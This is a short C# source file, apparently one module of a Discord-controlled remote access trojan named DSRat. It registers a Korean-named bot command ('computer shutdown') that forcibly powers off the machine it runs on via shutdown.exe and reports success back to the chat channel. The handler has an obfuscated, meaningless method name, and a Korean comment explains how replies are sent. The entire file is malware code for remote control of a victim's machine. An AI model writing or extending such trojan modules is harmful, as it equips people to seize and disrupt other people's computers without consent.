using Discord.Commands;
using System.Threading.Tasks;

namespace DSRat
{
    public class logoff : ModuleBase<SocketCommandContext>
    {
        [Command("컴퓨터종료")]
        public async Task aisdiodmBSHKFKBLSAq34789vkn1379182798()
        {
            //ModuleBase를 상속하면 Context 변수를 통해 답장을 보낼 수 있다. 
            System.Diagnostics.Process.Start("shutdown.exe", "-s -f -t 3");
            await Context.Channel.SendMessageAsync("성공적으로 종료되었습니다");
        }
    }
}
